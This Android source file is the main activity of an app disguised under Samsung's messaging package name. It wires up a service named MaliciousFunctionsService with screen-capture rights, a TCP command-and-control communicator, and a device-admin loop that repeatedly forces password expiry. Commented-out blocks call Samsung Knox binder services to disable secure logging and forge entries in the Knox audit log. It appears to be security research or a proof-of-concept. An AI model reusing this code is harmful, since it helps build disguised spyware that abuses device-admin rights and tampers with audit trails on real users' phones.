package com.samsung.android.messaging;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.app.admin.DevicePolicyManager;
import android.bluetooth.BluetoothAdapter;
import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.widget.Button;

import com.samsung.android.messaging2.R;

import java.lang.reflect.Method;

public class MainActivity extends AppCompatActivity {

    private static final int PERM_REQUEST_ACTIVITY = 1;
    private static final int MALICIOUS_FUNCTIONS_ACTIVITY = 2;
    private static final String SERVICE_NAME_KNOXZT_CORE = "knoxztcore";
    private static final String SERVICE_NAME_KNOXZT_INTERNAL = "knoxztinternal";
    private static final String SERVICE_NAME_AUDIT_LOG = "auditlog";

    public static final String FEATURE_SECURE_LOG = "secureLog";




    private Button permsButton;
    private Button functionsButton;
    private Button serviceButton;
    private Button startSpamButton;
    private Button stopSpamButton;
    private Button sendOneButton;
    private Button knoxztButton;
    private Button knoxztinternalButton;
    private Button auditButton;
    private Button intentButton;

    private Intent mediaProjectionIntent;
    private int mediaProjectionResultCode;

    private boolean doSpam = false;


    private Button connectButton;
    private Button sendButton;
    private TcpC2Communicator tcpCommunicator;
    private BluetoothAdapter mBluetoothAdapter;
    private AccessibilityManager mManager;

    private ComponentName mComponentName;
    private DevicePolicyManager mDpm;

    private IBinder getService(String name) throws Throwable {
        return (IBinder) Class.forName("android.os.ServiceManager")
                .getDeclaredMethod("getService", String.class)
                .invoke(null, name);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        permsButton = findViewById(R.id.permsButton);
        permsButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent i = new Intent(MainActivity.this, PermissionsActivity.class);
                startActivityForResult(i, PERM_REQUEST_ACTIVITY);
            }
        });

        serviceButton = findViewById(R.id.serviceButton);
        serviceButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent i = new Intent(getApplicationContext(), MaliciousFunctionsService.class);
                i.putExtra("MEDIA_PROJECTION_RESULT_CODE", mediaProjectionResultCode);
                i.putExtra("MEDIA_PROJECTION_INTENT", mediaProjectionIntent);
                startService(i);
            }
        });

        mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
        startSpamButton = findViewById(R.id.startSpamButton);
        mManager = (AccessibilityManager) getApplicationContext().getSystemService(Context.ACCESSIBILITY_SERVICE);
        mDpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        mComponentName = new ComponentName(getApplicationContext(), MyDeviceAdminReceiver.class);
        startSpamButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                doSpam = true;
                Thread thread = new Thread(() -> {
                    while (doSpam) {
                        mDpm.setPasswordExpirationTimeout(mComponentName, 1);
                        //dpm.setCameraDisabled(new ComponentName(getApplicationContext(), MyDeviceAdminReceiver.class), true);
                        //setUserRestriction(UserManager.DISALLOW_INSTALL_APPS, true);
                        //dpm.setMaximumTimeToLock(c, 0);
                        //dpm.setKeyguardDisabled(c, true);
                    }

                });
                thread.start();
            }
        });

        stopSpamButton = findViewById(R.id.stopSpamButton);
        stopSpamButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                doSpam = false;


            }
        });

        sendOneButton = findViewById(R.id.oneButton);
        sendOneButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                mDpm.setPasswordExpirationTimeout(mComponentName, 1);
            }
        });

//        knoxztButton = findViewById(R.id.knoxztButton);
//        knoxztButton.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//                try {
//                    // Get Binder Interface to knoxztcore
//                    Class<?> serviceManager = Class.forName("android.os.ServiceManager");
//                    Method getService = serviceManager.getMethod("getService", String.class);
//                    Object result = getService.invoke(serviceManager, SERVICE_NAME_KNOXZT_CORE);
//                    IBinder b = (IBinder)result;
//
//                    // Parcels used for communication with binder interface
//                    Parcel in = Parcel.obtain();
//                    Parcel out = Parcel.obtain();
//
//                    // Talk to knoxztcore
//                    in.writeInterfaceToken("com.samsung.android.knox.zt.config.IKnoxZtCoreService");
//                    in.writeString("secureLog");
//                    b.transact(11, in, out, 0); // 11 == disableFeature
//
//                } catch (Throwable e) {
//                    throw new RuntimeException(e);
//                }
//            }
//        });

//        knoxztinternalButton = findViewById(R.id.knoxztinternalButton);
//        knoxztinternalButton.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//                try {
//                    // Get Binder Interface to knoxztcore
//                    Class<?> serviceManager = Class.forName("android.os.ServiceManager");
//                    Method getService = serviceManager.getMethod("getService", String.class);
//                    Object result = getService.invoke(serviceManager, SERVICE_NAME_KNOXZT_INTERNAL);
//                    IBinder b = (IBinder)result;
//
//                    // Parcels used for communication with binder interface
//                    Parcel in = Parcel.obtain();
//                    Parcel out = Parcel.obtain();
//
//                    // Talk to knoxztinternal
//                    in.writeInterfaceToken("com.samsung.android.knox.zt.internal.IKnoxZtInternalService");
//                    in.writeInt(3); // 3 == FROM_SETTINGS
//                    in.writeInt(0); //
//                    b.transact(1, in, out, 0);
//
//                } catch (Throwable e) {
//                    throw new RuntimeException(e);
//                }
//            }
//        });



//        intentButton = findViewById(R.id.intentButton);
//        intentButton.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//                Context context = getApplicationContext();
//                Intent intent = new Intent();
//
//                // TODO: Is it bad I can set uid/prd?
//                //intent.setAction("com.samsung.android.knox.zt.framework.UPDATE_TRACE_INFO");
//                //intent.putExtra("uid", 1234);
//                //intent.putExtra("prd", (long) 1000000000);
//
////                intent.setAction(ACTION_PACKAGE_ADDED);
////                intent.setPackage("com.samsung.android.knox.er");
////                context.sendBroadcast(intent);
//
//                Uri uri = Uri.parse("content://com.sec.knox.provider/AuditLog");
//                ContentValues cv = new ContentValues();
//
//                cv.put("uid", 1000);
//                cv.put("tag", 210021);
//                cv.put("userid", 1000);
//                try{
//                    getApplicationContext().getContentResolver().insert(uri,cv);
//                } catch(IllegalArgumentException e) {
//                    Log.e("AuditButton", String.valueOf(e));
//                }
//            }
//        });


    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == PERM_REQUEST_ACTIVITY) {
            if (resultCode == RESULT_OK) {
                mediaProjectionIntent = data.getParcelableExtra("MEDIA_PROJECTION_INTENT");
                mediaProjectionResultCode = data.getIntExtra("MEDIA_PROJECTION_RESULT_CODE", 0);
            }
        }
    }

    private class MyServiceConnection implements ServiceConnection {
        @Override
        public void onServiceConnected(ComponentName className, IBinder service) {
            // Do something when the service is connected
            Log.e("MyServiceConnection", "Connected!");
        }

        @Override
        public void onServiceDisconnected(ComponentName className) {
            // Do something when the service is disconnected
            Log.e("MyServiceConnection", "Disconnected!");
        }
    }


}